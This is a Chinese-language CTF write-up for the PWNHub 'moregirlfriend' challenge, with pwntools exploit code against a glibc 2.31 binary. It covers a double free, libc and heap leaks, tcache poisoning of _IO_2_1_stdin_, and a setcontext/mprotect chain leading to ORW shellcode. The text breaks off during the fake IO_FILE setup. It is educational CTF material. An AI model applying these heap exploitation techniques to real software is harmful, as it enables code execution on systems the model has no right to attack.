[WP]PWNHub公开赛moregirlfriend

Glibc 2.31 ORW绕过

还是太菜了Orz

程序分析

经典菜单题,libc-2.31

开了沙箱,禁用了execve

IDApro反汇编分析

getgirlfriend函数:

申请数量范围0-15

size大小15-0x500

同时把idx最大的块设置一个GETGIRLFRIEND位=1

breakup函数:

引入CHUNK_PTR_LEAVE数组保存被选择breakup的块

GETGIRLFRIEND位=0

saygoodbye函数:

释放所有CHUNK_PTR_LEAVE数组保存的块

漏洞分析

free之后垃圾数据残留泄露libc;

.bss数组CHUNK_PTR[]和FREE_LIST[]数组中间的空间只有0x40字节,

而saygoodbye最多可以释放9个块,即可以重复释放chunk[0],既可以造成UAF利用.

利用分析

简要分析

UAF构造TcacheAttack打_IO_2_1_stdin_ , 覆盖_IO_write_ptr 为stdin+0xe0 (_IO_2_1_stdin_结构体之后,作为setcontext+61的rdx).

改vtable 到 **_IO_str_jumps **, 之后exit(0)时调用会触发malloc@plt来调用malloc_hook.

继续填充malloc_hook为setcontext+61,触发malloc之后就调用setcontext+61以_IO_write_ptr作为rdx调整相关寄存器.

之后调用mprotect修改区块权限,调用shellcode1(SYS_read)读入shellcode2(ORW)并执行.

IO_File调用链:

exit(0) ==> __run_exit_handlers ==> _IO_cleanup ==> _IO_flush_all_lockp ==> IO_file_overflow ==> malloc ==> __molloc_hook ==> setcontext+61 ==> mprotect ==> shellcode1(SYS_read) ==> shellcode2(ORW)

详细分析

1. UAF

.bss段分析:

add(0,0x450,"0")
add(1,0x450,"1")
delete(1,[0])
  • FREE_LIST数组在0x0060-0x0098,共0x40字节,最多容纳到 FREE_LIST[7]
  • CHUNK_PTR数组在0x00a0-0x0118,共0x80字节,最多容纳到CHUNK_PTR[15]
  • 从0x0120之后开始是SIZE[]数组

在breadup函数中,NUM参数最大为8,即for(i=0 ; i < NUM ; i++),在FREE_LIST中最多放入8个块地址,最大到FREE_LIST[7]

在saygoodbye中,NUM参数同样最大为8,即for(i=0 ; i <= NUM && FREE_LIST[i]; i++),即醉倒运行释放到FREE_LIST[8]

而根据.bss段的排布来看FREE_LIST[8] == CHUNK_PTR[0]

导致如果在FREE_LIST靠前的位置放入CHUNK_PTR[0]的地址,同时参数NUM设置为8,就会释放两次CHUNK_PTR[0],造成doublefree

而doublefree会导致UAF漏洞.

2.leak libc

leak libc利用这里释放chunk但是没有清空垃圾数据(主要是bk)的遗漏,申请并释放unsortedbin

利用先打印再释放的先后顺序,就可以泄露libc地址

add(0,0x450,"0")
add(1,0x450,"1") # leave top chunk
delete(1,[0])
add(0,0x450,"0"*8)
delete(1,[0]) # leak libc (unsortedbin bk)
p.recvuntil("0"*8)
addr = u64(p.recvuntil('\x7f').ljust(8,'\x00'))
libc_base = addr-libc.sym['__malloc_hook'] - 0x10 - 96
log.success("libc_base ==> "+hex(libc_base))
delete(1,[1]) # init bins

3.构造UAF&leak heap

由于Tcache对double free的检查更为严格,这里我们选择先打出fastbin的double free同时泄露heap

故需要先把相应大小的tcache bins填满.

for i in range(7+4): #chunk[0-12]
  add(i,0x68,str(i)*0x20)

之后为了能够泄露heap地址,原理同leak libc,且只有NUM==8的时候能够产生double free

所以先释放2个chunk

delete(2,[1,2]) # Full tcache

这样就会再tcachebins中填充2个chunk

之后再释放NUM==8 的9个chunks,构造double free的同时leak heap

delete(8,[3,4,5,6,7,8,0,9]) # double free chunk[0]
# 2+8+1 = 11chunks = 7tcaches + 3fatsbins(loss chunk[8])
# fastbins: chunk[0]->chunk[9]->chunk[0]

double free之前:

Tcachebins:[7]->[6]->[5]->[4]->[3]->[2]->[1]

Fastbins:[9]->[0]->[8]

再doublefree之中:

先printf(“%s”,chunk[0]) ==> 打印chunk[0]的fd( chunk[8]的地址 ) ==> 泄露heap地址

再free(chunk[0]) ==> 完成doublefree,同时覆盖原来chunk[0]的fd由chunk[8]改为chunk[9]

doublefree之后:

Tcachebins:[7]->[6]->[5]->[4]->[3]->[2]->[1]

Fastbins:[0]->[9]->[0]

这样再第二次释放chunk[0]的时候,就可以泄露heap地址

p.recvuntil("9 has left you.")
heap = u64(p.recvuntil('\x55').ljust(8,'\x00')) >> 8 # 出去结尾'0x0a'
heap_base = heap & 0xfffffffff000
log.success("heap_base ==> "+hex(heap_base))

4.构造TcacheAttack

利用FastbinAttack在堆上打出一个size比较大的Tcache doublefree

首先在一个合适的位置写入0x291 ( 0x60+0x70*5 ) 的fake size,顺便清空tcache

for i in range(7): # empty tcache
  if i == 6: # fake size
    add(6,0x68,p64(0)+p64(0x291)) # 0x290 = 0x60+0x70*5
  else:
    add(i,0x68,"="*0x20+"=["+str(i)+"]=")

这里就存在一个

chunk[6] --> 0x00000000 0x00000071 (alloc)
             0x00000000 0x00000291
             0x00000000 0x00000000

之后通过原来的fastbin doublefree,构造这个chunk的堆重叠(通过之前获得的heap_base地址)

add(7,0x68,p64(heap_base+0x320))

add(11,0x68,"11")
add(12,0x68,'12')
add(13,0x68,'13') # tcache don't check chunk_size

得到效果

chunk[6] --> 0x00000000 0x00000071 (alloc)
chunk[13]--> 0x00000000 0x00000291
             0x00000000 0x00000000

之后再malloc(0x280)的chunk并释放配合得到unsortedbin链

add(14,0x280,"14")

之后再释放chunk[13],得到unsortedbins: chunk[13] -> chunk[14]

之后释放chunk[6]再申请回来修改fd,指向stdin,得到stdin任意写

delete(3,[14,13,6])
add(6,0x68,p64(0)+p64(0x291)+p64(stdin))
add(12,0x288,'12')

得到TcacheBins : _IO_2_1_stdin_

5.构造fake IO等

由于在搞glibc版本中setcontext+53的寄存器调整为rdx而不是原来的rdi,这里就需伪造_IO_2_1_stdout_的_chian指向的IO_file来得到更好的调用链,具体如下:

首先修改stdin的结构体,主要就是修改flag位为0xfbad1800,修改_IO_write_ptr到stdin+0xe0,修改vtable到_IO_str_jumps,

具体如下:

add(12,0x288,'12')

其中我们注意到,我们修改了_IO_write_ptr位为p64(stdin+0xe0),首先这个stdin的IO_file结构体大小就是0xe0,这里是把这个指针指向该结构体下面我们另外一块可以控制的地方.

既stdin+0xE0就是_IO_wide_data_0处的地址,这里我们依然可以任意写,之后的malloc_hook我们依然可以任意写

填充完stdin之后就是填充stdin+0xE0,这里我们填充为SROP的mprotect部分
